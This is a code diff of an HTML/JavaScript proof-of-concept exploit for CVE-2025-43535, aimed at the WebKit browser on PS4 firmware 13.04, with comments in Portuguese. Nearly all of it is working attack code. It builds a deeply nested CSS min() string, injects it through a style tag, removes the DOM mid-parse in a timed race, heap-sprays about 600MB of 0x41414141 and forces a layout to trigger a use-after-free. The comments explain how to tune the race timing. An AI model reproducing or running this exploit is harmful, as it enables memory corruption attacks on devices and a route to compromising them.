@@ -3,10 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 — Memory Corruption POC</title>
+<title>CVE-2025-43535 — UAF Native</title>
+<style>
+  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
+  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
+  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
+</style>
 </head>
 <body>
-<div>CVE-2025-43535 - PS4 FW 13.04</div>
+<div>CVE-2025-43535 · UAF Race Condition · PS4 FW 13.04</div>
 <div id="log"></div>
 <div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>
 
@@ -20,92 +25,94 @@ const L = (m, c) => {
 };
 
 // ==========================================
-// CONFIGURAÇÃO DO HEAP SPRAY
+// 1. O PAYLOAD FALSO (HEAP SPRAY)
 // ==========================================
-// Vamos criar blocos de 4MB preenchidos com o marcador 0x41414141
-const SPRAY_CHUNK_SIZE = 1024 * 1024; // 1 Milhão de inteiros de 32-bits = 4MB
+const SPRAY_CHUNK_SIZE = 1024 * 1024; // 4MB por chunk
 const sprayData = new Uint32Array(SPRAY_CHUNK_SIZE);
-sprayData.fill(0x41414141); // O ponteiro falso que queremos injetar
+sprayData.fill(0x41414141); // O ponteiro falso (AAAA)
 
 const heapSprayArray = [];
 
 function fireHeapSpray() {
-  L('HEAP SPRAY com 0x41414141...', 'warn');
+  L('Pulverizando RAM com 0x41414141...', 'warn');
   try {
-    // Alocamos cerca de 600MB de dados falsos instantaneamente.
-    // O objetivo é ocupar o exato espaço físico na RAM que o WebKit 
-    // liberou ao destruirmos a árvore do CSS.
     for (let i = 0; i < 150; i++) { 
-      const chunk = new Uint32Array(sprayData);
-      heapSprayArray.push(chunk);
+      heapSprayArray.push(new Uint32Array(sprayData));
     }
-    L('Heap Spray concluído', 'ok');
+    L('Heap Spray alocou ~600MB sobre a memória liberada.', 'ok');
   } catch (e) {
-    L('Heap Spray OOM' + e, 'fail');
+    L('Heap Spray OOM no JS: ' + e, 'fail');
   }
 }
 
 // ==========================================
-// LÓGICA DO EXPLOIT (RACE CONDITION)
+// 2. A ISCA MATEMÁTICA (Nível 24)
 // ==========================================
-// O TEMPO MÁGICO: Isso dita quando vamos puxar o tapete.
-// Se for muito alto, o PS4 dá OOM. Se for muito baixo, a árvore não fica profunda o suficiente.
-// Leandro, você precisará afinar esse valor (ex: tente 50, 80, 120, 150)
-const RACE_TIMEOUT_MS = 95; 
+function buildDepth(depth) {
+  let e = '1px';
+  for (let d = 1; d <= depth; d++) {
+    e = 'min(' + e + ',' + e + ')';
+  }
+  return e;
+}
+
+// ==========================================
+// 3. A CORRIDA (RACE CONDITION)
+// ==========================================
+// Como o nível 24 é mais leve, o parser vai processar mais rápido.
+// A janela de tempo cai para a casa dos 30ms a 80ms.
+const RACE_TIMEOUT_MS = 45; 
 
 async function run() {
-  L('Preparando Race Condition...', 'info');
+  L('Construindo isca de Nível 24 (~36MB no JS)...', 'warn');
 
-  if (!('serviceWorker' in navigator)) return;
-
-  try {
-    await navigator.serviceWorker.register('sw.js');
-    if (!navigator.serviceWorker.controller) {
-      setTimeout(() => window.location.reload(), 500);
+  setTimeout(() => {
+    let payload;
+    try {
+      payload = buildDepth(24);
+      L('String construída. Injetando no C++ via tag <style>...', 'ok');
+    } catch(e) {
+      L('Falha ao gerar string: ' + e, 'fail');
       return;
     }
 
-    L('Service Worker pronto...', 'ok');
+    // Criamos os elementos
+    const styleEl = document.createElement('style');
+    styleEl.textContent = `.t{width:${payload}}`;
+    
+    const divEl = document.createElement('div');
+    divEl.className = 't';
+    
+    // Injetamos no DOM (O WebKit C++ começa a mastigar os 36MB agora)
+    document.head.appendChild(styleEl);
+    document.getElementById('stage').appendChild(divEl);
 
-    // 1. A Isca (Cria a árvore complexa)
-    const el = document.createElement('div');
-    el.className = 't';
-    document.getElementById('stage').appendChild(el);
-
-    const link = document.createElement('link');
-    link.rel = 'stylesheet';
-    link.href = 'payload.css'; 
-    document.head.appendChild(link);
-
-    L(`Esperando ${RACE_TIMEOUT_MS}ms para o C++ se afogar na árvore...`, 'warn');
-
-    // 2. A Puxada de Tapete
+    // O C++ vai tentar montar a árvore e calcular o layout de divEl.
+    // Nós interrompemos o processo milissegundos depois!
     setTimeout(() => {
-      L('Deletando DOM e abortando CSS...', 'crash');
+      L('PUXANDO O TAPETE! Deletando árvore de estilos...', 'crash');
       
-      // Removemos do DOM. O WebKit tenta limpar os nós C++
-      document.head.removeChild(link);
+      // Remove do DOM (marca a árvore C++ para destruição)
+      document.head.removeChild(styleEl);
       document.getElementById('stage').innerHTML = ''; 
 
-      // 3. O Heap Spray (Substitui os objetos antigos pelo nosso payload)
+      // Pulveriza a RAM imediatamente
       fireHeapSpray();
 
-      // 4. O Gatilho (Força o motor a se recalcular)
-      L('Forçando layout global para engatilhar o Dangling Pointer...', 'warn');
+      L('Forçando o gatilho de layout no motor...', 'warn');
       try {
-        void document.body.offsetWidth;
+        // Se o WebKit ainda tiver ponteiros fantasmas da árvore, vai ler 0x41414141
+        void document.body.offsetWidth; 
       } catch(e) {}
 
       L('-------------------------------------', 'info');
-      L('Se o console crashear AGORA, e os logs do PS4 mostrarem falha', 'crash');
-      L('no endereço 0x41414141, VOCÊ CONSEGUIU UM UAF!', 'ok');
+      L(`Teste concluído com Timeout de ${RACE_TIMEOUT_MS}ms.`, 'ok');
+      L('Se o console não crashear, altere a variável RACE_TIMEOUT_MS.', 'info');
       L('-------------------------------------', 'info');
 
     }, RACE_TIMEOUT_MS);
 
-  } catch (error) {
-    L('Erro: ' + error, 'fail');
-  }
+  }, 100);
 }
 
 window.addEventListener('load', run);
